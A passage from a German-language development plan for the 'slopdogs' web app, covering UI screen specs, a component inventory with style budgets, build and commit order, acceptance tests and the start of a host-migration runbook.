**Run-only-Kennel** (Kennel-RUN, P3.5 Stufe 1): Chapter Card mit `RUN ONLY` und `● LIVE`; Wellenbaender mit **Ink-Silhouetten** (35 %, keine Namen, keine Icons — W17: der Server liefert auf Kennel-Stufe keine Identitaet); Satz `11 dogs in 3 waves. You can run this kennel and read its output at the public address. The code stays with its owner, <name>.`; `[OPEN /k/<id>]` `[Docs]`; kein Inspector, keine Palette; `[⏵ RUN]` zeigt nur `● live · 1.8 s`, nie Waves; `⋯` = Open page, Docs, Copy link; Sterne bewertbar (W21); Owner-Name ohne Mail, kein Request-Knopf (Follie 7.7: spaeter). Redigierter privater Dog in lesbarem Kennel (Stufe 2): Karte mit Schloss, Inspector nur `parents` und Fehlertext, Kopf `private · owned by …`; nie ein leerer Editor.

Editor-Rechte: Drag aus der Palette; Karten-Klick -> Dog-Inspector; Kanten-Klick -> Kommentar als Popover; `Ctrl/⌘+Enter` Run, `Ctrl/⌘+S` Save, `Esc` schliesst; Karten-Kontextmenue `⋯`: Open, Code, Result, Make lead, Cut branch, Remove from kennel, bei fremden gepinnten Dogs `Update pin` (ersetzt `icon-menu-fan`).

**S3 Settings-Drawer (560, Ink-Kopf `‹ KENNEL   SETTINGS`).** NAME, ID (Data `rennkarte · /k/rennkarte`, rename im `⋯`), DESCRIPTION, EMOJI (Popover); VISIBILITY drei Radios (`public — anyone can run and read` / `run only — anyone can run, code private` / `private — only the people below`); PEOPLE (S8); **FREEZE** Schalter `freeze this kennel` (an -> Chip `frozen`, alle Edits gesperrt; Small `Runs, ratings and copies keep working.`); DOGS · ORDER AND LEAD (Drag `≡`, `[make lead]`, `×`; fremder run-only-Dog als Ink-Zeile mit `PINNED v7`; `+ add from palette` — Base-Dog-Checkboxen entfallen, Base-Dogs kommen aus der Palette mit Filter `base`; ↑↓ als Tastaturweg); DEFAULTS Query-Chips und Body-JSON; `[SAVE] Cancel Delete kennel`. Zustaende: Laden (Skeleton), Speichern (`[SAVING…]`, Felder gesperrt), Fehler (Banner oben, Feldfehler unter dem Feld), kein Recht (Drawer oeffnet nicht, Toast `You can't edit this kennel.`), frozen (read-only mit Unfreeze-Banner), Segmentregel live (`a/b` -> `IDs are one URL segment: letters, digits, . _ -`).

**S6 Dogs (side B, Browser) — neu.** Chapter Card `SIDE B · 139 TRACKS · 52 PACKS` / `DOGS` / `sorted by proven`. Filter-Rail 240 (Desktop; Mobil Sheet mit Zaehler `FILTER 2`): **group** (all / base / dogs / mimic, mit Zaehlern), **pack** (Suchfeld + Checkboxen mit Zaehlern, aus den `dogs-*`-Paketnamen — Datenquelle P4b `list_nodes`/`GET /api/nodes` mit `pack`-Feld, das P4b-Commit 12 aus dem Registry-Namen des Base-Dogs bzw. der Klasse ableitet), **owner** (everyone / mine / foreign / run only). Sortier-Chips `proven` (Default, 8.26) · `calls 30d` · `reuse` · `name`; Zahlen `desc`. Alles in der URL (`?q=&sort=&group=&pack=&owner=`) — ein gefilterter Browser ist teilbar. Zeile = Tracklist: Nummer, Icon (Ink `◼` fuer fremde run-only-Dogs = die schwarze Kassette), Name Bebas 18, Chip `proven`/`unproven`, Plakette (`ranked30d`), Reuse als `4 k` (Data, `title="used in 4 kennels"`), **Rechte-Chip** am Zeilenende (`read` / `run` / `edit` = was der Aufrufer darf, aus `myRights` P3.5). Zweite Zeile Small: Pack oder Owner, Beschreibung; bei fremd run-only `run only · pinned by n kennels`; bei eigenen `yours · 3 h ago`. Base und Dogs in **einer** Liste (anders als die Palette), `base` ist ein Filter. **Vorschau** (rechts 440 Desktop / 480 ab 1440; Mobil Sheet) oeffnet bei Zeilen-Klick, URL `?dog=<lineageId>` (Deep-Link). Ink-Kopf: Icon, Name, Pack, Version, Rechte-Chip. Tabs: **overview** (vier Stat-Kacheln `runs 30d / reliable / kennels / avg ms`, Proven-Regel in Small, Usage-Liste mit Kennel-Links und `⏵`, `+n private`, depends on / used by als Chips), **code** (Monaco inlay, read-only, nur bei READ; sonst fehlt der Tab und der Kopf sagt `run only · code stays with <owner>`), **usage** (volle Liste, wenn overview bei fuenf abschneidet). Footer: **`[USE IN KENNEL ▾]`** (8.24: v1; Picker der eigenen editierbaren Kennels, fuegt den Dog hinzu; bei run-only-Dogs pinnt er die aktuelle Version und sagt es: `Pinned to v7. Output flows, code never.`), `[Open in kennel]`, wenn der Dog schon in einem eigenen Kennel ist. Zustaende: Laden (Skeleton-Zeilen, Rail-Zaehler `—`); Kaltstart ab 3 s Schleier; Leer ungefiltert `NO DOGS YET.` / `Base dogs arrive with the server; yours arrive with your first kennel.`; Leer gefiltert `Nothing matches.` `[Clear filters]` (loescht alle, behaelt `q`); alter Server ohne `stats` (Proven-Chip und -Sort fehlen, Sort faellt auf `name`); Vorschau laedt (Kopf sofort aus der Zeile, Kacheln Skeleton, Usage drei Skeleton-Zeilen); Vorschau-Fehler `Couldn't load usage.` `[Retry]` im Tab; run-only-Vorschau (kein Code-Tab, `[USE IN KENNEL ▾]` pinnt); Anonym (Rechte-Chips zeigen `run`/`read` wie fuer anon; `[USE IN KENNEL]` -> Login).

**S4 Palette (in S2).** Drawer links 360 (Dock 320 ab 1440), Mobil Sheet; dieselben Tracklist-Zeilen wie der Browser, kleiner. Ink-Kopf `DOGS ×`, Suche, Chips `ALL · base · mine`, Sort `PROVEN · name` (Default proven, localStorage `slopdogs.palette.sort.v1`), `[+ NEW DOG]` quiet; Gruppen-Labels `BASE` / `DOGS` (getrennt, P4b 4b.8); fremder run-only-Dog als Ink-Zeile `run only · v7` (fuegt gepinnt hinzu). Klick fuegt hinzu (Toast `Added GeocodeLookup.`; run-only `Added StripeWebhook, pinned to v7.`), Drag bleibt, `i` am Zeilenende oeffnet die Browser-Vorschau in neuem Tab (`/dogs?dog=<id>`). Zustaende: Laden, leer (`No dogs match "geo".` `[Clear]`), ohne `stats`, kein Recht (nicht erreichbar), frozen (nicht erreichbar, Hinweis in der Bottom-Bar).

**S5 Dog-Inspector, S7 Rating-Tab.** Drawer 420, Ink-Kopf `‹ KENNEL` / `📍 GEOCODELOOKUP` (H1 auf Ink) / `PROVEN · 4 kennels · 812 ms avg · v7 · yours`; Tabs `code · context · result · parents · usage · stats · access`; Default `code` bei lesbaren SerializedDogs, `result` bei Base-Dogs und fremden run-only-Dogs (die keine code/context-Tabs haben); Monaco inlay; `[SAVE & RERUN]  v7 · 2d`. `usage` und `stats` sind dieselben Komponenten wie die Browser-Vorschau. Rating-Tab: Sterne 24 px, `4.3 · 12 ratings`, Histogramm als harte Ink-Balken auf `--paper-3`, `YOUR RATING ★★★★☆` oder `Your kennel. Owners and editors don't rate.`, Small `tap the same star to remove`; Zustandsmaschine woertlich aus P4 4.9 (`loading` Sterne `--ink-3`; `anonymous` mit `Sign in to rate`, `returnTo=…?panel=rating`; `readonly-owner`; `unrated` Hover-Vorschau Orange; `rated`; `saving` 60 %; `error` Small `--danger-ink` `Couldn't save: <error_description>`, 401 -> anonymous); gesetzter Stern mit `--ease-slam` 320 ms, Kopf-Aggregat ohne Reload. Ort: Inspector-Tab, Kopf nur Aggregat (8.6, Follie 7.11).

**S8 Access (Kennel in S3, Dog in S5).** VISIBILITY drei Radios; PEOPLE Zeilen `Avatar · Name/Mail · Rolle ▾ · Rechte-Chips · ×` (Rollen owner / editor / reader / runner; Chips `RUN · READ · EDIT` — Follie zeigt zusaetzlich `COPY` und den Schalter `readers may copy`; **beides entfaellt nach W16 (COPY = READ, Nira)**, der Rest bleibt); Eingabe `( email ) reader ▾ [ADD]`; **FREEZE** Schalter `frozen` (Owner; bei Community-Eintraegen nur Superuser, 8.16) mit Small `Nobody edits a frozen kennel, you included. Runs, ratings and copies keep working.`; `Release ownership` (danger-Textlink, Confirm). Community-Eintrag: Chip `community`, `[Claim]` fuer Eingeloggte (8.16: Community entwickelt sich weiter). Zustaende: Laden, Speichern je Zeile (60 %), Fehler Small unter der Zeile, nicht Owner (read-only, Chips sichtbar), frozen. Datenquelle `GET/PUT /api/:sub/:id/acl` + `POST …/freeze|unfreeze` (P3.5 3.5.6).

**S9 Account** (`/account`, max 720, Chapter Card `ACCOUNT`, Tabs profile · tokens · keys): keys = Tracklist `01 openweather ••••3f2c api.openweathermap.org` / `used 2 h ago · no grants ×`, `[+ ADD KEY]`, Pflichthinweis (P4c 4c.3, woertlich englisch), Add-Key-Sheet (Alias-Regel live, Passwortfeld `Shown once. Never again.`, Domains als Chips, aufklappbar `Grant to kennels` mit Pflicht-Quota), Zustaende `keystore_disabled` (`The key store is off on this server.`), leer (`No keys yet.`), Loeschen-Confirm `Delete openweather? Dogs using {{key:openweather}} will fail.`; tokens = PAT-Zeilen (`[Revoke]`; Anlegen zeigt den Wert einmal in einer Ink-Befehlsbox mit `⧉`; JSON-Fassung der `/auth/tokens`-Routen in U7); profile = Avatar, Name, Mail, `Sign out`, `claude mcp add`-Befehlsbox. **S10 Login** `/login?returnTo=`: zentriert `◎ SLOPDOGS` (Emblem + Bebas 28), `[CONTINUE WITH GOOGLE]` (quiet, 2 px Ink, 44 px), ein zufaelliger Vers (Small kursiv, Name Label teal). **S11 Schleier**: 0-3 s nichts ausser Skeleton; ab 3 s Tape-Deck-SVG 96 px mit drehenden Spulen, `WAKING THE KENNEL  0:42` (Label + Data-Timer), 2 px Ink-Strich als deterministischer Ease-out ueber 120 s bis 90 % (behauptet nie "fertig"), Vers; ab 10 s `Cold starts take up to two minutes.`; bei Antwort 100 % und weg in 200 ms; ab 150 s `[RETRY]` und `Still cold. Try again, or come back in a minute.`; reduced motion: Spulen statisch, Strich linear, Timer bleibt. **Void-Kino und Iris** (8.18): die Iris ist die Nabe der linken Spule (12 px Ink-Scheibe als Button, 44 px Trefferflaeche, keine sichtbare Affordanz, `aria-label="void"`); Klick oeffnet das Kino mit dem Lade-Video (`LOADING_EASTER_EGG_EMBED_URL`); Klick auf jeden Fehler-Banner-Text oeffnet es mit dem Fehler-Video (`ERROR_FLASH_VIDEO_EMBED_URL`). Das Kino selbst umgestylt: Vollbild `--ink` 96 %, YouTube-iframe in 2 px Papier-Rahmen mit `6px 6px 0 var(--accent)`-Schatten (die `.cmd`-Behandlung der Landing), Kopf-Label in Papier, Fluester-Untertitel Small kursiv `#bfb595`, `×` oben rechts und `Esc`. Nichts sonst in der App referenziert die Videos.

#### 6.5 Komponenten-Inventar (Follie Rev. 2, 42 Komponenten, mit Stilbudget)

| Komponente | Zweck | Varianten | Zustaende | Styles |
|---|---|---|---|---|
| `sd-top-bar` | Emblem, Wortmarke, Side-Links, Suche, `+ New`, Auth | list, browser, account | anon / login; mobile | inline ≤ 3 kB |
| `sd-bottom-bar` | Mobil-Tabs `Kennels · Dogs`; auf S2 `Dogs · Run · Inspect` | sides, kennel | active, running (Spulen-Punkt) | inline ≤ 2 kB |
| `sd-chapter-card` | Ink-Seitenkopf: Kicker, Bebas-Titel, rechts Data, Chips | page, kennel-head (zwei Zeilen, Aktionen) | sticky, compact (< 1100) | scss ≤ 4 kB |
| `sd-kennel-head` | S2-Kopf auf der Chapter Card: URL, docs, Plakette, Sterne, Run, `⋯` | full, compact, run-only, read-only, frozen, old-version | idle, running, failed, live | scss ≤ 6 kB |
| `sd-track-row` | Tracklist-Zeile fuer Kennels und Dogs | kennel (desktop / mobile), dog (browser / palette), foreign (Ink-Fuellung) | default, hover, yours (Teal-Ton), private, run-only, frozen, no-stats | scss ≤ 5 kB |
| `sd-plaque` | `▷ 1 240 · 30d` | compact, full (`title` mit total) | 0, n, missing (rendert nichts) | inline ≤ 1 kB |
| `sd-stars` | Sterne | aggregate 16 px, input 24 px | loading, anonymous, readonly-owner, unrated, rated, saving, error | inline ≤ 2 kB |
| `sd-histogram` | fuenf harte Balken | – | empty | inline ≤ 1 kB |
| `sd-chip` | Label-Maker | ink, live, soft, outline (filter, active) | – | **global** |
| `sd-status-chip` | Punkt + Wort auf Chip | live, running (Spulen-Punkt), failed, cold, cached, frozen, run-only, read-only, pinned | – | inline ≤ 1,5 kB |
| `sd-proven-badge` | `proven` / `unproven` | compact, full | badge, unproven, missing | inline ≤ 1 kB |
| `sd-rights-chip` | was der Aufrufer darf: `run` / `read` / `edit` | – | – | inline ≤ 1 kB |
| `sd-url-chip` | Data mit `⧉` | inline, command box (Ink, `.cmd`) | copied, fallback | inline ≤ 1,5 kB |
| `sd-sort` | Sortier-Chips / Sheet | kennels (4), dogs (4) | active key, direction | inline ≤ 2 kB |
| `sd-filter-rail` | Browser-Filter: group, pack, owner | rail (Desktop), sheet (Mobil) | counts loading (`—`), active count badge | scss ≤ 4 kB |
| `sd-search` | Suche mit `?q=` | inline, sheet | empty, typing, cleared | inline ≤ 1 kB |
| `sd-drawer` | Drawer/Sheet-Huelle mit hartem Schatten | right, left, docked, sheet (peek / half / full) | open, closing, stacked | scss ≤ 5 kB |
| `sd-tabs` | Label-Tabs mit Ink-Unterstrich | inline, scrollable | active, dirty dot, badge | inline ≤ 1,5 kB |
| `sd-wave-canvas` | ruled inlay: Raster, Wellenbaender, Chips, Zoom/Pan | full, silhouette (run-only) | empty, loaded, running (Stagger), error-dog | scss ≤ 8 kB (Graph-Overrides inklusive) |
| `sd-dog-card` | Karte auf dem Canvas | paper, lead (harter Schatten), base, foreign (Ink, Pin), redacted (Schloss), silhouette | selected (Orange-Outline), ok, failed, cached, dragging | scss ≤ 4 kB |
| `sd-dog-preview` | Browser-Vorschau Panel / Sheet | drawer, sheet | loading, run-only (kein Code-Tab), error | scss ≤ 4 kB |
| `sd-dog-inspector` | Tabs code / context / result / parents / usage / stats / access | drawer | loading, redacted, foreign-pinned, readonly, dirty, saving | scss ≤ 6 kB |
| `sd-code-editor` | Monaco-Huelle mit Theme "inlay" | ts, json, readonly | loading (lazy), error | scss ≤ 2 kB |
| `sd-usage-list` | Kennels, die einen Dog nutzen | short (5), full | loading, empty, list, error, hidden-n | inline ≤ 2 kB |
| `sd-stat-tiles` | vier Data-Kacheln mit 1 px Linien | 4-up, 2×2 | missing | inline ≤ 1,5 kB |
| `sd-kennel-picker` | "use in kennel"-Menue der editierbaren Kennels | menu, sheet | loading, empty (`No kennel you can edit.`), pinning | inline ≤ 2 kB |
| `sd-access-panel` | Sichtbarkeit (3 Stufen), Personen mit Rollen, Freeze, Release | kennel, dog | loading, saving-row, error-row, community, readonly, frozen | scss ≤ 5 kB |
| `sd-role-select` | Rollen-Dropdown mit Rechte-Chips | – | disabled (owner) | inline ≤ 1,5 kB |
| `sd-switch` | Schreibmaschinen-Toggle (Ink-Quadrat gleitet) | – | on, off, disabled | **global** |
| `sd-key-row` / `sd-key-form` | Key-Store | – | disabled (503), empty, saving, delete-confirm | scss ≤ 4 kB |
| `sd-token-row` | PAT-Zeile | – | revealed-once, revoked | inline ≤ 1,5 kB |
| `sd-field`, `sd-textarea`, `sd-chips-input` | Formularprimitive, Schreibmaschinen-Unterlinie | default, code, error | focus, disabled, invalid | **global** |
| `sd-button` | primary (Orange), quiet, ink, danger, icon | sm 32, md 36, lg 44 | hover (lift), disabled, busy | **global** |
| `sd-veil` | Schleier mit Deck, Spulen, Vers, Timer, Iris | list, canvas, fullscreen | fast (< 3 s: nichts), warming, cold (≥ 150 s, retry) | inline ≤ 3 kB |
| `sd-tape-deck` | SVG-Deck mit zwei Spulen | 96 px (Schleier), 16 px (Spulen-Punkt im Status-Chip) | spinning, stopped | inline ≤ 1,5 kB |
| `sd-void-cinema` | YouTube-Overlay, umgestylt (war `error-video-popup`) | error, loading | open, closing | scss ≤ 3 kB |
| `sd-empty` | leerer Zustand | list, browser, canvas, usage, keys | – | inline ≤ 1 kB |
| `sd-banner` | Fehler-/Hinweiszeile mit 2 px Linie links | danger, warn, info | dismissible, with-action, cinema-trigger | inline ≤ 1,5 kB |
| `sd-toast` | eine Zeile, 4 s | default, with-link | – | inline ≤ 1 kB |
| `sd-confirm` | Dialog mit hartem Schatten | default, danger | busy | scss ≤ 2 kB |
| `sd-version-timeline` | bleibt | kennel, dog | selected, pinned, current | bestehend, Tokens |
| `sd-auth-badge` | bleibt | anon, user | menu-open | bestehend, umgefaerbt |

Entfallen: `kennel-scenic-parallax-backdrop`, `void-mythic-backdrop`, `void-requiem-glyph-watermark`, `icon-menu-fan`, `kennel-action-fan`, `floating-panel-window`, `dog-toolbar`, `kennel-emoji-picker` als Komponente, die Nebula im `loading-indicator` (ersetzt durch `sd-veil` + `sd-tape-deck`). Behalten und umgestylt: `error-video-popup` -> `sd-void-cinema`; die Iris wandert von der Nebula auf die linke Spule. Sterne und Plakette sind handgeschriebene Laufzeiten auf dem Inlay: Ink, Mono, keine Box; Farbe nur als Orange-Hover und Slam.

#### 6.6 Reihenfolge U1-U8 (Follie Rev. 2, 6.1) und was aus den frueheren Phasen hierher gehoert

| Schritt | Inhalt | Setzt voraus | Traegt UI-Teile aus |
|---|---|---|---|
| U1 | Tokens, Chips, Buttons, Fields, Switch in `styles.scss` unter `@layer tokens, base, primitives`; Fonts self-hosted (Bebas Neue, Courier Prime 400/700, Pirata One); Monaco-Theme "inlay" (Registrierungs-Hook, JS); Backdrops und Nebula entfernen; `sd-veil` + `sd-tape-deck` mit Iris; `sd-void-cinema` umgestylt; `DESIGN.md`; Signals-Vereinheitlichung; Englisch im Chrome | 8.5-Merge; 8.18/8.20 entschieden; 8.22/8.23 | — |
| U2 | S1 Kennels: Chapter Card, Tracklist-Zeilen, Sort, Suche, Plakette, Sterne-Aggregat, Skeleton, frozen/run-only-Chips, Anlege-Sheet; `kennel-list.component.scss` wird geloescht | P3 (Pfade), P4 (stats), P3.5 (`frozen`, `myRights`) | P4 Commit 8 |
| U3 | S2 Kennel-Kopf + ruled Canvas (Baender, Karten, fremde Ink-Karten mit Pin, Silhouetten, run-only-Ansicht, frozen-Zustand), Bottom-Bar | P3.5 (Redaction-Stufen, `myRights`, Pin) | P3.5 Commit 5 |
| U4 | Drawer/Sheet-Huelle mit Snap; Kennel-Inspector-Tabs brief/versions/rating/stats | P4 (Rating-API, `histogram`) | P4 Commit 8 (`kennel-rating`, `?panel=rating`) |
| U5 | S6 Dog-Browser `/dogs`: Filter-Rail, Zeilen, Vorschau mit stats/usage/code, `[USE IN KENNEL]` mit Pinning; Palette-Zeilen mit proven und fremden Dogs; Dog-Inspector-Tabs | P4b (Stats, Usage, `sort=proven`, `pack`) | P4b Commit 14 |
| U6 | S3 Settings-Drawer, `sd-access-panel` (drei Stufen, vier Rollen, Freeze); Route `/kennels/:id/edit` -> Drawer; `kennel-config` faellt | P3.5 (REST `/acl`, `freeze`) | P3.5 Commit 5 |
| U7 | `/account` (profile/tokens/keys), `/login`; JSON-Fassung der PAT-Routen | P4c | P4c UI (Keys) |
| U8 | Tastaturkuerzel, Toasts, Motion-Feinschliff; Dark "tape shell" nur, wenn 8.24 = v1 | — | — |

Regel je Feature (Lotus, kein doppeltes UI): In P3.5/P4/P4b/P4c wird UI-seitig nur gebaut, was Typen und Service-Aufrufe betrifft (`*.model.ts`, `*.service.ts`), plus die Pfad-Umstellung aus P3. Jede sichtbare Flaeche entsteht einmal, in P6, auf Tokens. Jeder Schritt endet mit einem Sichttest Desktop und Mobil und `npm run ui:build` mit Produktionsbudgets.

#### 6.7 Stilbudget-Strategie (Follie Rev. 2, 6.2)

`anyComponentStyle` (20/24 kB) gilt je Komponenten-Stylesheet, nicht fuer `src/styles.scss` (faellt unter `initial` 500 kB). Heute: `kennel-list.component.scss` 25,4 kB Quelle, `waves-dog-palette` 7 kB, `_primitives.scss` 6,3 kB (per `@use` in jede Waves-Komponente kopiert). Regeln: (1) global, was global ist — Tokens, Reset, Typo-Rollen, `sd-button`, `sd-field`, `sd-chip`, `sd-switch`, Tabs, Linien, Fokus, Reduced-Motion, der Monaco-Theme-Hook, in `styles.scss` unter `@layer tokens, base, primitives`; geschaetzt 16-20 kB unkomprimiert (gerechnet, im Bau messen), einmal geladen. (2) Komponenten-SCSS traegt nur Layout, kein `@use` von Primitives; Ziel ≤ 8 kB, Deckel 12 kB. (3) Inline `styles` fuer Kleinteile (Plakette, Sterne, Chips, Status, Rechte, Deck) ≤ 2 kB, OnPush. (4) Graph-Overrides nur in `sd-wave-canvas`. (5) Monaco lazy (78ba628); die Huelle 2 kB; das Theme ist JS, nicht CSS. (6) Harte Schatten sind **eine** Utility-Klasse `.sd-lift` in den globalen Styles (Drawer, Dialog, Toast, Lead-Karte). (7) `ng build` bricht bei 24 kB ab; die 20-kB-Warnung gilt im Review als Fehler. Rechnung Liste nach U2: `sd-track-row` 5 kB + Seite 3 kB + Skeleton 1 kB = 9 kB statt 25 (gerechnet); der Browser nutzt die Zeile wieder und addiert 4 kB Rail + 4 kB Vorschau.

#### 6.8 Testfaelle und Abnahme

1. Given `data-theme` fehlt (v1 nur Papier); When jeder Screen S1-S11 Desktop und Mobil; Then Sichttest (Screenshots in `docs/slopdogs/ui-sichttest/`, PNG ≤ 200 kB — einzige weitere Dateien, die P6 im Repo anlegt); Orange erscheint je Screen hoechstens zweimal (Zaehlung im Screenshot).
2. Given `npm run ui:build`; Then keine Budget-Warnung; `git ls-files ui-app/src | xargs grep -l "Courier New"` = 0; `grep -rn "fonts.googleapis" ui-app/src public` = 0; `ui-app/public/fonts/` enthaelt genau Bebas Neue, Courier Prime 400/700, Pirata One (woff2 + OFL).
3. Given Lighthouse mobil auf `/kennels`, `/kennels/<seed>`, `/dogs`; Then Accessibility ≥ 95, Performance ≥ 85 (Zielwerte, gesetzt); keine fremden Hosts im Netzwerk-Tab ausser YouTube nach Klick auf Banner oder Iris.
4. Given Kennel run-only, anonym; When `/kennels/<id>`; Then Silhouetten, kein Dog-Name im DOM, `[⏵ RUN]` zeigt nur Status und Dauer; Sterne setzbar nach Login.
5. Given eigener Kennel mit fremdem run-only-Dog (8.15); Then Ink-Karte mit Namen und Chip `pinned v<n>`, Inspector ohne `code`/`context`; Given neuere Version des Fremd-Dogs; Then `Update pin` fuer Editoren.
6. Given Kennel frozen; Then Chip `frozen` in Liste und Kopf, alle Mutations-Controls disabled mit `title="Frozen. Unfreeze in settings."`, Settings read-only mit Unfreeze-Banner nur fuer Owner; `[⏵ RUN]` und Sterne funktionieren; Export laeuft (8.25).
7. Given `/dogs?sort=proven&owner=foreign&dog=<lineage>`; Then Browser gefiltert, Vorschau offen mit Tabs overview/usage (kein code, wenn kein READ), `[USE IN KENNEL ▾]` listet nur editierbare, nicht gefrorene Kennels; Wahl pinnt einen run-only-Dog und toastet `Pinned to v<n>. Output flows, code never.`
8. Given `/kennels/<id>/edit` als Deep-Link; Then Kennel-Seite mit geoeffnetem Settings-Drawer; als Nicht-Editor Toast `You can't edit this kennel.`.
9. Given `/account?tab=keys` ohne `KEYSTORE_MASTER_KEY_V1`; Then `The key store is off on this server.`.
10. Given `prefers-reduced-motion`; Then Spulen statisch, keine Stagger-Animation (computed `animation-duration` ≤ 0.01 ms), Schleier-Strich linear.
11. Given Klick auf Fehler-Banner-Text bzw. auf die Iris; Then `sd-void-cinema` oeffnet mit dem jeweiligen Video; `git grep -n "youtube-embed\|EMBED_URL" ui-app/src` zeigt nur `sd-void-cinema`, `sd-banner`, `sd-veil`.
12. Given Sortier-Chip `stars`; Then `?sort=rating&dir=desc` in der Anfrage; localStorage `slopdogs.kennelList.sort.v3`; Browser-Default ohne `?sort=` ist `proven` (8.26).
13. Given `ui-app/src` nach U8; Then `git grep -n "Ausfuehren\|Zurueck\|Kennels durchsuchen" ui-app/src` = 0 (Englisch durchgehend); kein `border-radius` ausser 0 in `ui-app/src` (`git grep -n "border-radius" ui-app/src | grep -v ": 0"` = 0).

Abnahme: Tests 1-13; `kennel-list.component.scss` existiert nicht mehr; Komponenten-Stylesheets alle ≤ 12 kB (`ng build`-Warnung als Beweis oder `scripts/check-style-budget.cjs`); `npm test` inkl. Doc-Lint gruen (Routentabelle += `/dogs`, `/account`, `/login`; **nicht** `/dogs/:id`).

#### 6.9 Commit-Schnitt

1. `feat(ui): Mixtape-Tokens global, Fonts self-hosted, Monaco-Theme inlay, DESIGN.md; Backdrops/Nebula/tote Komponenten/Faecher entfernt; sd-veil mit Deck und Iris; sd-void-cinema` — U1.
2. `feat(ui): Kennel-Liste als Tracklist (chapter card, sd-track-row, sort, search, plaque, stars, frozen/run-only chips), Anlege-Sheet, Schleier; kennel-list.scss geloescht` — U2.
3. `feat(ui): Kennel-Kopf, ruled Canvas mit Karten, Ink-Karten mit Pin, Silhouetten, run-only- und frozen-Ansicht, Bottom-Bar` — U3.
4. `feat(ui): Drawer/Sheet mit Snap, Kennel-Inspector-Tabs brief/versions/rating/stats, Rating-Widget mit Histogramm` — U4.
5. `feat(ui): /dogs-Browser mit Filter-Rail, Vorschau und Use-in-kennel (Pinning); Palette-Zeilen; Dog-Inspector-Tabs usage/stats` — U5.
6. `feat(ui): Settings-Drawer, Access-Panel (3 Stufen, 4 Rollen, Freeze), kennel-config entfernt` — U6.
7. `feat(ui): /account (profile/tokens/keys), /login; PAT-Routen als JSON` — U7.
8. `feat(ui): Tastaturkuerzel, Toasts, Motion-Feinschliff` — U8.
9. `docs(mcp): Texte fuer P6` — 4.0 (Routentabelle, README-Routen `/dogs`, `/account`, `/login`).

Abhaengigkeiten: 2-8 <- 1; 2, 3, 6 <- P3.5; 4 <- P4; 5 <- P4b; 7 <- P4c.

#### 6.10 Dateien

`ui-app/src/styles.scss` (neu geschrieben, `@layer`) · `ui-app/src/app/styles/_tokens.scss`, `_primitives.scss` (aus `pages/waves-viewer/` hochgezogen) · `ui-app/DESIGN.md` (neu) · `ui-app/public/fonts/*.woff2`, `OFL.txt` (neu: Bebas Neue, Courier Prime 400/700, Pirata One) · `ui-app/src/app/monaco/inlay-theme.ts` (neu) · `ui-app/src/index.html` (Fonts, Monaco-Lazy) · `ui-app/src/app/app.routes.ts` (`/dogs`, `/account`, `/login`) · `ui-app/src/app/components/sd-*/` (neu, 6.5) · `ui-app/src/app/pages/kennel-list/*` (Template neu, `.scss` geloescht) · `ui-app/src/app/pages/waves-viewer/*` (Kennel-Kopf, Canvas, Inspector-Tabs) · `ui-app/src/app/pages/kennel-config/*` (geloescht) · `ui-app/src/app/pages/dogs/*`, `pages/account/*`, `pages/login/*` (neu) · geloescht: `components/dog-toolbar`, `floating-panel-window`, `kennel-scenic-parallax-backdrop`, `void-mythic-backdrop`, `void-requiem-glyph-watermark`, `icon-menu-fan`, `kennel-action-fan`, `kennel-emoji-picker`, `directives/kennel-card-motion.directive.ts`, `services/backdrop-drive.service.ts`, `src/assets/bg1.*` · umbenannt: `error-video-popup` -> `components/sd-void-cinema` (behaelt `data/video-popup.ts`, `utils/youtube-embed.ts`) · `mcp/auth/personal-tokens.ts` (JSON-Fassung) · `api/routes/routeTable.ts` (SPA-Routen) · README, skill.md (4.0).

### P7 — Host-Umzug und Aussenwelt (Runbook; zuletzt, Entscheidung 8.3)

**Ziel.** Der Dienst laeuft unter einem neuen Render-Host mit neuem Namen; alle Fremden, die an Host oder Pfad haengen, folgen: dogdoc-Skill, ki-fruechte, `~/.claude.json`, Permission-Listen, Google-Konsole, eigene Notizen, GitHub-Repo. Der alte Dienst wird abgeschaltet, sobald der neue laeuft (8.1 entschieden — kein Weiterleiter; alte Links in dogdoc-Berichten und ki-fruechte sterben mit dem Abschalten). Alle Aufrufe gegen Render macht der 10-0.

**Vorbedingung.** P1-P6 sind auf `feature/slopdogs` committed und per Merge auf `integration` (Render deployt manuell; Build `npm run render:integration:build` `package.json:91`, Start `npm run start:integration:dist` :85). Empfehlung: zuerst diesen Stand auf dem **alten** Dienst deployen und live pruefen (die Env-Aliase tragen die alten `DATADOGS_*`-Namen; `MCP_AUTH_REQUIRED=true` muss dort gesetzt sein, sonst verweigert der Guard aus P3.5 den Start — vorher im Render-Dashboard pruefen), dann den neuen Dienst anlegen — eine Variable je Schritt.

**Was am Host haengt (gezaehlt von Boreal, Stand 25.09.).** PATs: `iss` = `MCP_BASE_URL` (`mcp/auth/jwt.ts:60,77-79`) -> jede PAT wird ungueltig. Google-Callback (`google.ts:23,45`). `~/.claude.json`: 1 MCP-Eintrag `datadogs-int`. `~/.claude/settings.json`: 50 Vorkommen `mcp__datadogs-int` (48 eindeutige Werkzeuge + Wildcard :4); `settings.local.json`: 13 + `WebFetch(domain:datadogs-9qde.onrender.com)` :39 + Bash-Eintraege :245. dogdoc-Skill: `SKILL.md:32,33,209,224,367`, `beispiel/README.md:4`, `beispiel/3-shell.js:22` (Host und Pfad hart). ki-fruechte: `builder.js:103` TRUSTED_HOSTS-Regex, `:105` DATADOGS_BASE, `:673` folgt `publicUrl` (uebersteht `/k/`), `:113/:1028` HEAD `/`; `sitzung.js:36, :2137, :2150` (`basis + '/' + lineageId` — bricht am Pfad); `vorlagen/veroeffentlichen.js:15, :267, :615, :663, :697`; Tests `test/sitzung/seiten.js:36,94`, `sitzung_test.js:35,2183`, `werkstatt_pool_test.js:23`, `modell_test.js:359`; `prompts/builder.md:39`, `.prompts/_builder.txt:39`; Env `KIF_DATADOGS_TOKEN`. Eigene Notizen: `~/.claude/skills/dataDog/skill.md`, `lotus/frames/vauban/SKILL.md`, `~/.claude/lotus/kifruechte-design/datadogs-sitzung-0913.md`, Memory (`reference_datadogs_mcp.md` + 8 md mit `datadogs-int`, 7 md mit Host).

**Runbook (nummeriert; je Pruefung und Rueckweg).**

> **Aenderung 2026-09-26 (10-0: neues Repo, frischer Start — Protokoll 1.2).** Der neue Dienst baut aus einem **neuen GitHub-Repo**, nicht aus `dataDogs`. Deshalb gibt es einen Schritt 0, und Schritt 13 entfaellt als Rename. `dataDogs` bleibt als Archiv mit voller Historie (inkl. `feature/slopdogs`).
>
